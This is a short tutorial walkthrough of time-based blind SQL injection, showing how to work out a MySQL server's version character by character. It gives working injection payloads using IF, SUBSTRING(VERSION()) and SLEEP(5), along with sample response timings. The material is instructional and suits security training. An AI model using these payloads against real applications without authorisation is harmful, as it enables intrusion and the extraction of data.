Time-Based Blind SQLi Walkthrough

Step-by-step inference of database version.

Scenario: MySQL Version Discovery

You've found a blind SQLi vulnerability in a MySQL application. No errors or direct data are returned. Your goal is to determine the MySQL version using time-based techniques.

Step 1: Establish Baseline

Make a normal request to the vulnerable parameter and record the average response time. This helps identify legitimate delays.

Step 2: Test First Character

Inject: 1 AND IF(SUBSTRING(VERSION(), 1, 1) = '5', SLEEP(5), 0). Observe if the response takes ~5 seconds longer. If so, the first character is '5'.

Step 3: Iterate for Next Characters

If the first character is '5', test the second: 1 AND IF(SUBSTRING(VERSION(), 2, 1) = '.', SLEEP(5), 0). Continue this process, incrementing the position and testing characters.

Example Iteration:
# Test for '5'
id=1 AND IF(SUBSTRING(VERSION(),1,1)='5',SLEEP(5),0)
-> Response: ~5 seconds

# Test for '.'
id=1 AND IF(SUBSTRING(VERSION(),2,1)='.',SLEEP(5),0)
-> Response: ~5 seconds

# Test for '7'
id=1 AND IF(SUBSTRING(VERSION(),3,1)='7',SLEEP(5),0)
-> Response: ~5 seconds

Inferred Version: 5.7...
Key Takeaway

Successful time-based blind SQLi requires careful observation of response times and systematic character-by-character inference.
